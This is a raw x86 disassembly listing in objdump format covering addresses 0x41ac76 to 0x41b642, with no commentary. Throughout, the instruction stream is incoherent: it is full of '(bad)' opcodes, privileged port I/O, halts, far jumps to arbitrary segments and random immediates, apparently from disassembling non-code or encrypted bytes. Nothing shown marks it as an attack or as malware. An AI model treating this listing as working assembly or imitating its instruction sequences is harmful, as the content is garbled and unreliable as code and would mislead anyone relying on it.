  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edx+esi*4-0x6a]
  41ac82:	cli    
  41ac83:	mov    cl,BYTE PTR [ecx+0x1c]
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    eax,0x91000001
  41ac8d:	sub    edx,edx
  41ac8f:	jo     0x41ad06
  41ac91:	push   ds
  41ac92:	xor    eax,DWORD PTR [ebx]
  41ac94:	les    eax,FWORD PTR [ecx+0x51f1b6c7]
  41ac9a:	(bad)  
  41ac9b:	mov    ?,WORD PTR [ebx+edx*1]
  41ac9e:	ins    BYTE PTR es:[edi],dx
  41ac9f:	retf   
  41aca0:	pop    di
  41aca2:	clc    
  41aca3:	rcl    dh,cl
  41aca5:	jo     0x41ac66
  41aca7:	sti    
  41aca8:	add    ah,BYTE PTR [edi+0xe]
  41acab:	retf   
  41acac:	pop    esp
  41acad:	les    eax,FWORD PTR [ecx-0x10c52477]
  41acb3:	sub    eax,0x566d79b4
  41acb8:	mov    ecx,0x69d0efa
  41acbd:	mov    ch,0xd9
  41acbf:	adc    DWORD PTR [edi],0x27
  41acc2:	mov    dh,0x25
  41acc4:	adc    eax,0x1f618ff9
  41acc9:	clc    
  41acca:	mov    ch,0xe4
  41accc:	inc    esi
  41accd:	mov    BYTE PTR [ebx-0x54],0x7f
  41acd1:	(bad)  
  41acd2:	jmp    0xf97e:0x193a1331
  41acd9:	xchg   esi,eax
  41acda:	push   ecx
  41acdb:	lods   eax,DWORD PTR ds:[esi]
  41acdc:	bound  ebp,QWORD PTR [ecx+eiz*2+0x572c4e71]
  41ace3:	cs jbe 0x41ad62
  41ace6:	push   0x23bad0db
  41aceb:	pop    ds
  41acec:	inc    eax
  41aced:	aas    
  41acee:	out    0xbe,al
  41acf0:	loopne 0x41ac72
  41acf2:	stos   DWORD PTR es:[edi],eax
  41acf3:	ss mov bh,0xe4
  41acf6:	cwde   
  41acf7:	cld    
  41acf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf9:	mov    al,ds:0x135f22d0
  41acfe:	mov    ebp,0x82ededfd
  41ad03:	xlat   BYTE PTR ds:[ebx]
  41ad04:	inc    ebx
  41ad05:	out    dx,eax
  41ad06:	das    
  41ad07:	jge    0x41ad0d
  41ad09:	jg     0x41acce
  41ad0b:	push   0xbf9a0dd3
  41ad10:	cmp    DWORD PTR [ebp-0x46422efa],0xb688ed4f
  41ad1a:	(bad)  
  41ad1b:	ffree  st(3)
  41ad1d:	jmp    0xb2df60ea
  41ad22:	rcl    BYTE PTR ds:0x98ae3892,cl
  41ad28:	sahf   
  41ad29:	push   ebp
  41ad2a:	mov    ch,0x50
  41ad2c:	lds    eax,FWORD PTR [esi-0x19]
  41ad2f:	jmp    0x9c3e4605
  41ad34:	pushf  
  41ad35:	push   0xdebe7e55
  41ad3a:	or     ebx,edi
  41ad3c:	ja     0x41ad45
  41ad3e:	clc    
  41ad3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad40:	clc    
  41ad41:	jmp    0xead:0x9084f10b
  41ad48:	ins    BYTE PTR es:[edi],dx
  41ad49:	in     al,dx
  41ad4a:	rol    BYTE PTR es:[edi+0x292c5d65],1
  41ad51:	xor    ah,cl
  41ad53:	ficom  DWORD PTR [edi+ebp*8]
  41ad56:	mov    ah,0xf2
  41ad58:	adc    bh,BYTE PTR [edx+edx*4]
  41ad5b:	and    al,bh
  41ad5d:	sahf   
  41ad5e:	push   ecx
  41ad5f:	imul   ecx,edx,0x1d
  41ad62:	adc    DWORD PTR [eax],ecx
  41ad64:	out    0xa0,al
  41ad66:	adc    al,0x9d
  41ad68:	xchg   edx,eax
  41ad69:	push   edi
  41ad6a:	dec    ebp
  41ad6b:	call   0x53758eb2
  41ad70:	test   eax,0x5a8b34a5
  41ad75:	outs   dx,DWORD PTR ds:[esi]
  41ad76:	lea    edx,[ebx]
  41ad78:	sub    al,0x4d
  41ad7b:	test   esp,esp
  41ad7d:	or     dh,dl
  41ad7f:	xchg   esi,eax
  41ad80:	leave  
  41ad81:	int    0xa3
  41ad83:	jae    0x41ad0d
  41ad85:	repz (bad) 
  41ad87:	adc    al,0x99
  41ad89:	adc    BYTE PTR [edx+0x4775f536],bh
  41ad8f:	call   0x41ade4
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [eax+edx*1+0x4e91f72f],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	enter  0x7755,0x8
  41ae10:	mov    ?,WORD PTR [ecx]
  41ae12:	ss and al,0xd4
  41ae15:	outs   dx,DWORD PTR ds:[esi]
  41ae16:	imul   edx,DWORD PTR [ebx],0xe66cb9d6
  41ae1c:	int3   
  41ae1d:	(bad)  
  41ae1e:	xor    al,0x55
  41ae20:	outs   dx,DWORD PTR ds:[esi]
  41ae21:	push   0x36
  41ae23:	popf   
  41ae24:	xor    al,0xe2
  41ae26:	mov    esp,0x2182057e
  41ae2b:	rcr    ah,0x4a
  41ae2e:	push   ebx
  41ae2f:	fisttp DWORD PTR [ebp-0x5b39d3a9]
  41ae35:	mov    ds:0xcf5955ea,eax
  41ae3a:	fwait
  41ae3b:	push   ecx
  41ae3c:	outs   dx,DWORD PTR ds:[esi]
  41ae3d:	stos   BYTE PTR es:[edi],al
  41ae3e:	icebp  
  41ae3f:	mov    esp,0xdb1318f5
  41ae44:	ror    dh,1
  41ae46:	enter  0x7ec8,0xc
  41ae4a:	jmp    0x821a0485
  41ae4f:	pop    esp
  41ae50:	loope  0x41ae8f
  41ae52:	cwde   
  41ae53:	ss loopne 0x41ade9
  41ae56:	sbb    BYTE PTR [ecx],bl
  41ae58:	lock inc eax
  41ae5a:	rol    dh,0x8
  41ae5d:	pop    ds
  41ae5e:	mov    eax,0x387fcd8e
  41ae63:	xchg   edi,eax
  41ae64:	into   
  41ae65:	push   ds
  41ae66:	push   DWORD PTR [esi+0xe4665fc]
  41ae6c:	dec    esp
  41ae6d:	sbb    DWORD PTR [edx+0x68],ecx
  41ae70:	push   ebx
  41ae71:	pop    es
  41ae72:	mov    ebp,0x42994249
  41ae77:	or     eax,0x48c4ab6
  41ae7c:	test   eax,0x7bb54b21
  41ae81:	sti    
  41ae82:	js     0x41aed6
  41ae84:	cwde   
  41ae85:	add    eax,ecx
  41ae87:	imul   eax,DWORD PTR [edi],0xb7675750
  41ae8d:	ror    BYTE PTR ds:0xf6186849,1
  41ae93:	test   BYTE PTR [edi+eax*8],al
  41ae96:	and    eax,0x1829706f
  41ae9b:	mov    bh,0x44
  41ae9d:	cmp    BYTE PTR [ebp-0xea9f0ab],0x13
  41aea4:	int3   
  41aea5:	hlt    
  41aea6:	popa   
  41aea7:	and    dh,bl
  41aea9:	dec    esp
  41aeaa:	iret   
  41aeab:	inc    ebp
  41aeac:	sbb    eax,0xcbbf112e
  41aeb1:	dec    eax
  41aeb2:	ror    DWORD PTR ds:0x2a9e4c61,0x83
  41aeb9:	ins    BYTE PTR es:[edi],dx
  41aeba:	xlat   BYTE PTR ds:[ebx]
  41aebb:	fidiv  WORD PTR [esi+esi*8]
  41aebe:	enter  0x38b3,0xe1
  41aec2:	xchg   ebp,eax
  41aec3:	test   DWORD PTR [ecx-0x6],ebx
  41aec6:	mov    gs,WORD PTR [ebp+0x464a922f]
  41aecc:	mov    WORD PTR [esi],ds
  41aece:	mov    al,ds:0xdb09a1c6
  41aed3:	leave  
  41aed4:	add    esp,edx
  41aed6:	adc    ch,bh
  41aed8:	inc    eax
  41aed9:	inc    BYTE PTR [ebx-0x40b384c0]
  41aedf:	and    al,0x7b
  41aee1:	mov    cl,0x87
  41aee3:	(bad)  
  41aee4:	push   es
  41aee5:	cwde   
  41aee6:	jmp    0xbe03:0x6fb3ab61
  41aeed:	cmp    eax,0x3fe81775
  41aef2:	popf   
  41aef3:	push   edi
  41aef4:	call   0x51d8e76b
  41aef9:	arpl   WORD PTR [ebx+0x6673f463],dx
  41aeff:	or     esp,edi
  41af01:	cmp    esp,eax
  41af03:	add    al,BYTE PTR [edi]
  41af05:	lods   al,BYTE PTR ds:[esi]
  41af06:	mov    al,0xee
  41af08:	sahf   
  41af09:	out    0x2a,eax
  41af0b:	ins    DWORD PTR es:[edi],dx
  41af0c:	push   edi
  41af0d:	xchg   ebp,eax
  41af0e:	test   BYTE PTR [edi-0x2a],0x0
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x90d444ee
  41af82:	cdq    
  41af83:	popf   
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xf6000001
  41af8d:	cdq    
  41af8e:	repnz inc esp
  41af90:	outs   dx,BYTE PTR ds:[esi]
  41af91:	out    dx,al
  41af92:	popa   
  41af93:	call   0xbef9f99
  41af98:	neg    DWORD PTR [esi-0x1858f997]
  41af9e:	dec    ecx
  41af9f:	aaa    
  41afa0:	leave  
  41afa1:	push   ss
  41afa2:	push   edx
  41afa3:	dec    eax
  41afa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afa5:	stc    
  41afa6:	aas    
  41afa7:	daa    
  41afa8:	push   es
  41afa9:	jp     0x41af34
  41afab:	cmc    
  41afac:	sti    
  41afad:	idiv   DWORD PTR [ebx+0x31]
  41afb0:	mov    ds:0x1a070572,eax
  41afb5:	fdivr  QWORD PTR [edx+0x3fb14457]
  41afbb:	stos   BYTE PTR es:[edi],al
  41afbc:	repnz (bad) 
  41afbe:	nop
  41afbf:	sti    
  41afc0:	imul   DWORD PTR [ecx-0x7e]
  41afc3:	retf   0x4a7f
  41afc6:	mov    ds:0x7d672282,eax
  41afcb:	cmp    BYTE PTR cs:[edx+ecx*1-0x68f658cb],dh
  41afd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd4:	out    0x94,al
  41afd6:	sahf   
  41afd7:	mov    edi,0x66e24b3
  41afdc:	fwait
  41afdd:	or     DWORD PTR [ebp-0x26daa0a1],esp
  41afe3:	sub    DWORD PTR [edx-0x1dbd4a8e],eax
  41afe9:	inc    ebx
  41afea:	jns    0x41b006
  41afec:	jmp    0x4bb2:0x418622e
  41aff3:	retf   0xc1d4
  41aff6:	push   esi
  41aff7:	mov    ss,WORD PTR ds:0x44ccd190
  41affd:	add    esp,edi
  41afff:	and    ecx,DWORD PTR [ecx+0x4d]
  41b002:	ins    DWORD PTR es:[edi],dx
  41b003:	ja     0x41afc4
  41b005:	jns    0x41b06b
  41b007:	daa    
  41b008:	and    al,0xed
  41b00a:	xchg   ecx,eax
  41b00b:	pusha  
  41b00c:	xchg   edx,eax
  41b00d:	dec    ebp
  41b00e:	jae    0x41afe5
  41b010:	inc    eax
  41b011:	or     BYTE PTR [ecx-0x2aa282b7],ch
  41b017:	mov    ?,ecx
  41b019:	mov    eax,0x407609a9
  41b01e:	push   esi
  41b01f:	shl    ecx,cl
  41b021:	ret    0x6c9
  41b024:	or     al,0xd
  41b026:	ret    
  41b027:	mov    ebp,0x4ab356e9
  41b02c:	mov    esp,DWORD PTR [ebp+edi*4-0x11]
  41b030:	inc    esi
  41b031:	inc    ecx
  41b032:	sub    esp,DWORD PTR [ebx+0x57]
  41b035:	cmc    
  41b036:	sub    al,0xc
  41b038:	out    dx,al
  41b039:	push   ebp
  41b03a:	test   eax,0xd0d1adee
  41b03f:	cdq    
  41b040:	cmp    eax,0xd8d6510c
  41b045:	sub    ecx,DWORD PTR [ebx]
  41b047:	mov    edx,0xaaf11eda
  41b04c:	ins    DWORD PTR es:[edi],dx
  41b04d:	cdq    
  41b04e:	retf   0x36fa
  41b051:	dec    ebp
  41b052:	jbe    0x41b0ac
  41b054:	mov    WORD PTR [ebp-0x38],ss
  41b057:	inc    ebx
  41b058:	icebp  
  41b059:	fstp   TBYTE PTR [ecx-0x27c083e6]
  41b05f:	inc    eax
  41b060:	inc    ebx
  41b061:	push   es
  41b062:	add    al,0x8c
  41b064:	outs   dx,BYTE PTR ds:[esi]
  41b065:	shl    DWORD PTR [esi+ecx*8],1
  41b068:	dec    ecx
  41b069:	dec    ebx
  41b06a:	push   es
  41b06b:	mov    ah,0x50
  41b06d:	mov    al,0x76
  41b06f:	jb     0x41b0ed
  41b071:	pushf  
  41b072:	inc    eax
  41b073:	mov    eax,0xa68b038d
  41b078:	add    dl,BYTE PTR [edi]
  41b07a:	int    0xae
  41b07c:	add    DWORD PTR [eax+0x70],edx
  41b07f:	jo     0x41b100
  41b081:	in     eax,dx
  41b082:	mov    ecx,esi
  41b084:	lods   eax,DWORD PTR ds:[esi]
  41b085:	out    dx,al
  41b086:	add    al,0xec
  41b088:	xchg   esp,eax
  41b089:	fisubr WORD PTR [esi-0x26]
  41b08c:	mov    esi,0x4634326c
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xf6dc7585
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x1c000001
  41b10d:	inc    edx
  41b10e:	repz dec eax
  41b110:	fimul  WORD PTR [edi-0x32]
  41b113:	ss scas al,BYTE PTR es:[edi]
  41b115:	xchg   edi,eax
  41b116:	dec    esp
  41b117:	mov    ebp,ecx
  41b119:	push   es
  41b11a:	add    ecx,DWORD PTR [eax+0x498d465d]
  41b120:	sbb    dl,BYTE PTR [edx+edx*4]
  41b123:	mov    ch,BYTE PTR [ebp-0x22]
  41b126:	cmp    DWORD PTR [eax-0x3a],ebx
  41b129:	inc    eax
  41b12a:	ins    DWORD PTR es:[edi],dx
  41b12b:	jo     0x41b0fd
  41b12d:	xchg   edi,eax
  41b12e:	mov    edi,0xff8d488
  41b133:	inc    edi
  41b134:	mov    BYTE PTR [esi-0x30],0x7
  41b138:	inc    ecx
  41b139:	pop    eax
  41b13a:	pusha  
  41b13b:	push   0xbf3d45ad
  41b140:	mov    al,ds:0x7b033818
  41b145:	call   ax
  41b148:	sahf   
  41b149:	test   DWORD PTR [esi],esi
  41b14b:	mov    cs,WORD PTR [ecx+0x8123e20]
  41b151:	xor    ecx,DWORD PTR [eax]
  41b153:	jo     0x41b109
  41b155:	outs   dx,DWORD PTR ds:[esi]
  41b156:	test   DWORD PTR [ecx+0x5a9b1ec7],edx
  41b15c:	dec    ecx
  41b15d:	or     dl,al
  41b15f:	repz sar BYTE PTR [edi-0x7f],cl
  41b163:	cmp    DWORD PTR [ebp+0x12],esp
  41b166:	inc    esp
  41b167:	lahf   
  41b168:	cld    
  41b169:	pop    ebx
  41b16a:	std    
  41b16b:	xor    BYTE PTR [ebx-0x6515b91b],al
  41b171:	(bad)  
  41b172:	(bad)  
  41b174:	inc    ebp
  41b175:	and    ebx,DWORD PTR [esi-0x7921ea8b]
  41b17b:	adc    BYTE PTR [eax-0x43],ah
  41b17e:	pop    ebx
  41b17f:	or     al,0x77
  41b181:	and    ch,BYTE PTR [edi-0x2f]
  41b184:	loop   0x41b18d
  41b186:	sbb    al,0xb7
  41b188:	je     0x41b1bd
  41b18a:	mov    dl,0x85
  41b18c:	cmp    esi,DWORD PTR [edi]
  41b18e:	cmp    DWORD PTR [ebp+0x4db1a41],esi
  41b194:	(bad)  
  41b195:	retf   
  41b196:	loope  0x41b206
  41b198:	sar    DWORD PTR [edx],cl
  41b19a:	test   eax,0xdf254c83
  41b19f:	sbb    DWORD PTR [edi+0x70a36cf4],ebp
  41b1a5:	xor    al,0xc3
  41b1a7:	rol    DWORD PTR [ecx+0x29],0x4b
  41b1ab:	or     al,BYTE PTR [ecx]
  41b1ad:	xor    DWORD PTR [edx+edx*2+0x1b],eax
  41b1b1:	iret   
  41b1b2:	pop    edi
  41b1b3:	dec    eax
  41b1b4:	and    eax,0x74153aca
  41b1b9:	adc    al,0x90
  41b1bb:	adc    al,0xdd
  41b1bd:	imul   esi,eax,0x197bfb24
  41b1c3:	pushf  
  41b1c4:	fcomp  st(7)
  41b1c6:	cmp    al,0x26
  41b1c8:	jmp    0x39c609f2
  41b1cd:	jl     0x41b199
  41b1cf:	push   esp
  41b1d0:	and    eax,0xb0eebe74
  41b1d5:	std    
  41b1d6:	push   ds
  41b1d7:	sub    eax,0xf06a754f
  41b1dc:	cmp    esp,DWORD PTR [esi-0x80]
  41b1df:	jl     0x41b1fc
  41b1e1:	add    esi,DWORD PTR ds:0x8c508ff
  41b1e7:	fst    QWORD PTR [esi]
  41b1e9:	sub    edx,eax
  41b1eb:	add    edi,DWORD PTR ds:0x3d5ac38d
  41b1f1:	and    BYTE PTR [ecx+0x94a4052],0x6a
  41b1f8:	add    DWORD PTR ds:0x8edb8024,esi
  41b1fe:	dec    esi
  41b1ff:	and    BYTE PTR [ecx-0x5],dl
  41b202:	pop    edx
  41b203:	retf   0x4a92
  41b206:	stos   DWORD PTR es:[edi],eax
  41b207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b208:	aam    0x89
  41b20a:	fwait
  41b20b:	mov    cl,0x6
  41b20d:	sbb    ah,BYTE PTR [ebx]
  41b20f:	mov    ds:0x34,eax
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [edi+0x5de51f2a],bl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0x47000001,al
  41b28d:	xor    al,0x34
  41b28f:	add    edi,DWORD PTR [edi-0x2f099711]
  41b295:	inc    ebp
  41b296:	aas    
  41b297:	daa    
  41b298:	mov    DWORD PTR ds:0xb1ff9f22,0xa13040fc
  41b2a2:	jns    0x41b257
  41b2a4:	dec    ebx
  41b2a5:	or     eax,0x4f73916d
  41b2aa:	mov    bl,0xd9
  41b2ac:	push   ebp
  41b2ad:	push   ds
  41b2ae:	outs   dx,DWORD PTR ds:[esi]
  41b2af:	or     BYTE PTR [esi],0x70
  41b2b2:	test   BYTE PTR [esi+ebp*4-0x719422d4],ah
  41b2b9:	icebp  
  41b2ba:	cmp    ecx,DWORD PTR [edx+eiz*8-0x7d]
  41b2be:	or     al,0x72
  41b2c0:	call   0x3f4c:0x96bc42de
  41b2c7:	retf   
  41b2c8:	or     al,0xd8
  41b2ca:	cmp    DWORD PTR [eax+0x582312ef],edx
  41b2d0:	int    0x1e
  41b2d2:	pop    esi
  41b2d3:	cld    
  41b2d4:	bound  esi,QWORD PTR [ebx+0x35]
  41b2d7:	jne    0x41b2cd
  41b2d9:	push   ebx
  41b2da:	xchg   ebx,eax
  41b2db:	mov    edx,0x23eda182
  41b2e0:	pop    esi
  41b2e1:	jae    0x41b2ce
  41b2e3:	add    BYTE PTR [ebx-0x3],dh
  41b2e6:	jns    0x41b2fe
  41b2e8:	popf   
  41b2e9:	mov    esp,0xa12a1999
  41b2ee:	or     eax,0xaeb6b467
  41b2f3:	mov    ds:0xb1b59454,eax
  41b2f8:	test   DWORD PTR [esp+eax*2],edx
  41b2fb:	mov    dl,0xe8
  41b2fd:	jp     0x41b2e2
  41b2ff:	sub    al,0x7
  41b301:	jmp    0xe8cd:0xe1eae6c
  41b308:	sbb    BYTE PTR [esi+0x0],bh
  41b30b:	fsubp  st(3),st
  41b30d:	jo     0x41b29d
  41b30f:	jl     0x41b390
  41b311:	imul   esp,DWORD PTR [esi+0x133d3b98],0x161b456e
  41b31b:	hlt    
  41b31c:	pusha  
  41b31d:	pushf  
  41b31e:	test   DWORD PTR [ebx+0x2eca0b5a],0x79a9cec0
  41b328:	pusha  
  41b329:	mov    eax,0x2b5818f6
  41b32e:	aam    0x47
  41b330:	out    dx,eax
  41b331:	pop    ss
  41b332:	xor    al,0xf3
  41b334:	rcr    dh,cl
  41b336:	out    dx,eax
  41b337:	nop
  41b338:	or     ch,BYTE PTR [edi+edx*4+0x0]
  41b33c:	and    al,0x39
  41b33e:	jl     0x41b3b7
  41b340:	lods   eax,DWORD PTR ds:[esi]
  41b341:	fcomi  st,st(2)
  41b343:	ror    DWORD PTR [eax-0x20e87255],1
  41b349:	pop    esi
  41b34a:	dec    ebx
  41b34b:	push   0x6fe7dc45
  41b350:	scas   eax,DWORD PTR es:[edi]
  41b351:	hlt    
  41b352:	enter  0x5633,0xc2
  41b356:	xchg   BYTE PTR [edx-0xb],ch
  41b359:	jbe    0x41b35a
  41b35b:	push   esp
  41b35c:	mov    ecx,0x500a2dff
  41b361:	popf   
  41b362:	test   DWORD PTR [ecx+0x5b],ebp
  41b365:	test   al,0xe3
  41b367:	cmp    al,0xc7
  41b369:	sbb    dh,dh
  41b36b:	lea    ecx,[esp+eax*1]
  41b36e:	jne    0x41b36f
  41b370:	int    0xf3
  41b372:	add    DWORD PTR [ebp+0x512f75ac],esi
  41b378:	mov    DWORD PTR [edi+eiz*8-0xd63f95c],ebx
  41b37f:	mov    edx,0xd3f1b6bd
  41b384:	add    DWORD PTR [edi+0x27],ecx
  41b387:	in     eax,dx
  41b388:	addr16 cmc 
  41b38a:	aas    
  41b38b:	and    esp,DWORD PTR [esi]
  41b38d:	inc    esp
  41b38e:	xor    dh,BYTE PTR [edx+0x9f]
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	jge    0x41b40a
  41b402:	mov    BYTE PTR [eax+0x62],dl
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR ds:0x92000001,al
  41b40d:	jge    0x41b438
  41b40f:	test   DWORD PTR [eax],esp
  41b411:	and    eax,DWORD PTR [ebx]
  41b413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b414:	cld    
  41b415:	lea    esp,[ebp-0x2d]
  41b418:	aaa    
  41b419:	push   esp
  41b41a:	es xchg ecx,eax
  41b41c:	ror    DWORD PTR [edx+0x3fda6ea4],1
  41b422:	jp     0x41b3a5
  41b424:	retf   0x2790
  41b427:	cli    
  41b428:	aam    0xc
  41b42a:	jmp    0x41b43c
  41b42c:	fstp   st(3)
  41b42e:	sar    BYTE PTR [edx],1
  41b430:	or     ebx,DWORD PTR [edi-0x3]
  41b433:	loopne 0x41b490
  41b435:	adc    BYTE PTR [esi-0x674081e7],0xb6
  41b43c:	cmc    
  41b43d:	test   al,0xa8
  41b43f:	pop    ebx
  41b440:	dec    esp
  41b441:	cmp    ecx,DWORD PTR [ebx+0x1026be03]
  41b447:	and    edx,esp
  41b449:	lods   eax,DWORD PTR ds:[esi]
  41b44a:	xchg   ebx,eax
  41b44b:	(bad)  
  41b44c:	mov    dl,0xa3
  41b44e:	jmp    0x301c5152
  41b453:	shl    BYTE PTR [ebp-0x2cb3cc08],0x77
  41b45a:	sbb    al,0x5
  41b45c:	idiv   BYTE PTR cs:[ecx+0x52]
  41b460:	pop    eax
  41b461:	jne    0x41b4b0
  41b463:	push   edx
  41b464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b465:	jp     0x41b441
  41b467:	xchg   DWORD PTR [edi+edi*2-0x391c3d32],ebp
  41b46e:	inc    ebx
  41b46f:	aas    
  41b470:	push   edi
  41b471:	repz pop edi
  41b473:	enter  0x5738,0xed
  41b477:	xchg   esi,eax
  41b478:	mov    dl,0xbb
  41b47a:	rcl    BYTE PTR [ebp+0x41031fe0],1
  41b480:	add    BYTE PTR [edx],dl
  41b482:	mov    DWORD PTR [eax],ecx
  41b484:	mov    DWORD PTR [edi],esi
  41b486:	inc    edx
  41b487:	pop    ecx
  41b488:	dec    esi
  41b489:	dec    eax
  41b48a:	jge    0x41b4bc
  41b48c:	repnz inc esp
  41b48e:	or     BYTE PTR [edx-0x1e],bh
  41b491:	rol    al,1
  41b493:	xchg   BYTE PTR [eax-0x53],dh
  41b496:	inc    ebx
  41b497:	mov    DWORD PTR [edx-0x3e],edi
  41b49a:	in     al,dx
  41b49b:	mov    cl,0x69
  41b49d:	inc    esp
  41b49e:	or     eax,0xf9470de9
  41b4a3:	mov    ebp,0xe6b41313
  41b4a8:	jmp    0x41b466
  41b4aa:	sbb    ah,BYTE PTR [edi+ebx*1]
  41b4ad:	mov    eax,0xd092b785
  41b4b2:	adc    DWORD PTR [ebp-0x1c],edx
  41b4b5:	jnp    0x41b4c9
  41b4b7:	rol    BYTE PTR [ecx],cl
  41b4b9:	mov    DWORD PTR [edx+0x42],ecx
  41b4bc:	mov    ch,0xb
  41b4be:	adc    BYTE PTR ds:0x5a7f9527,ah
  41b4c4:	push   ecx
  41b4c5:	fsqrt  
  41b4c7:	icebp  
  41b4c8:	mov    ecx,ecx
  41b4ca:	mov    bh,0xc2
  41b4cc:	jae    0x41b505
  41b4ce:	and    edx,DWORD PTR [eax]
  41b4d0:	mov    ah,0xd5
  41b4d2:	cli    
  41b4d3:	(bad)  
  41b4d4:	adc    al,0x80
  41b4d6:	push   es
  41b4d7:	outs   dx,BYTE PTR ds:[si]
  41b4d9:	push   esi
  41b4da:	test   eax,0x7770a0f7
  41b4df:	fwait
  41b4e0:	out    dx,al
  41b4e1:	mov    eax,DWORD PTR [ebx*8+0x79bb6d92]
  41b4e8:	or     eax,0x96e341d9
  41b4ed:	sbb    ebp,DWORD PTR [ebp+0x5ac92daa]
  41b4f3:	int    0xf7
  41b4f5:	jmp    0x41b4ae
  41b4f7:	add    bh,ch
  41b4f9:	xchg   esi,eax
  41b4fa:	jne    0x41b4c8
  41b4fc:	imul   DWORD PTR [edx-0x12]
  41b4ff:	cs pop ebp
  41b501:	or     DWORD PTR [edi],ecx
  41b503:	mov    esp,0x2921759a
  41b508:	iret   
  41b509:	or     BYTE PTR [esi],ch
  41b50b:	mov    ecx,0xbc123ea5
  41b510:	dec    ecx
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	jecxz  0x41b5bd
  41b582:	fistp  QWORD PTR [esi]
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x68000001,al
  41b58d:	cmp    DWORD PTR [ebx],eax
  41b58f:	cmp    BYTE PTR [eax+0x4c6026b5],al
  41b595:	lea    edi,[esi]
  41b597:	icebp  
  41b598:	add    BYTE PTR [eax+0x55],dh
  41b59b:	cmp    al,0xf3
  41b59d:	dec    edx
  41b59e:	cli    
  41b59f:	pop    ds
  41b5a0:	outs   dx,BYTE PTR ds:[esi]
  41b5a1:	sub    ch,ch
  41b5a3:	dec    edx
  41b5a4:	add    al,0x49
  41b5a6:	sbb    esi,ebp
  41b5a8:	stc    
  41b5a9:	mov    bh,0x2
  41b5ab:	add    BYTE PTR [eax-0xc2b463e],bl
  41b5b1:	and    DWORD PTR [esi],edi
  41b5b3:	cld    
  41b5b4:	iret   
  41b5b5:	jl     0x41b614
  41b5b7:	sub    DWORD PTR [edx-0x37],esi
  41b5ba:	pusha  
  41b5bb:	je     0x41b603
  41b5bd:	cmp    BYTE PTR [ebx-0x6f],0xed
  41b5c1:	jp     0x41b5ba
  41b5c3:	in     eax,dx
  41b5c4:	push   es
  41b5c5:	retf   
  41b5c6:	jnp    0x41b610
  41b5c8:	cmp    ebx,esi
  41b5ca:	test   DWORD PTR [esi],edx
  41b5cc:	sbb    DWORD PTR [edi+0x7e93f219],esi
  41b5d2:	jmp    0xa67e:0x1abe4282
  41b5d9:	out    0xb6,eax
  41b5db:	jmp    0x6474cda7
  41b5e0:	cwde   
  41b5e1:	shl    DWORD PTR [eax],0x15
  41b5e4:	les    ecx,FWORD PTR [eax+0x40]
  41b5e7:	push   ss
  41b5e8:	call   0xfe5c:0xe67ca379
  41b5ef:	bound  edi,QWORD PTR [ecx-0x6b]
  41b5f2:	sub    BYTE PTR [esi-0x18d70d21],al
  41b5f8:	sbb    BYTE PTR [edx*4+0x11a89c6c],ch
  41b5ff:	jmp    0xa03db326
  41b604:	aaa    
  41b605:	sub    edx,edi
  41b607:	inc    edi
  41b608:	pop    es
  41b609:	inc    edx
  41b60a:	js     0x41b5fb
  41b60c:	fld    TBYTE PTR [eax-0x19]
  41b60f:	retf   
  41b610:	add    DWORD PTR [ecx],ebx
  41b612:	leave  
  41b613:	add    eax,0xf014d2f6
  41b618:	sbb    DWORD PTR [eax+ecx*4],ecx
  41b61b:	popa   
  41b61c:	ret    
  41b61d:	test   DWORD PTR [esi],ecx
  41b61f:	xchg   DWORD PTR [edi-0x9b7bdee],esp
  41b625:	out    dx,eax
  41b626:	stc    
  41b627:	push   edx
  41b628:	inc    ebp
  41b629:	mov    cl,0x62
  41b62b:	add    al,0x6a
  41b62d:	mov    ebp,0xe54a7466
  41b632:	jns    0x41b5db
  41b634:	pop    ss
  41b635:	imul   ebp,DWORD PTR [esi],0x58
  41b638:	aas    
  41b639:	repnz cmp cl,BYTE PTR [ebx-0x19e9fea4]
  41b640:	jo     0x41b645
  41b642:	pop    ebp
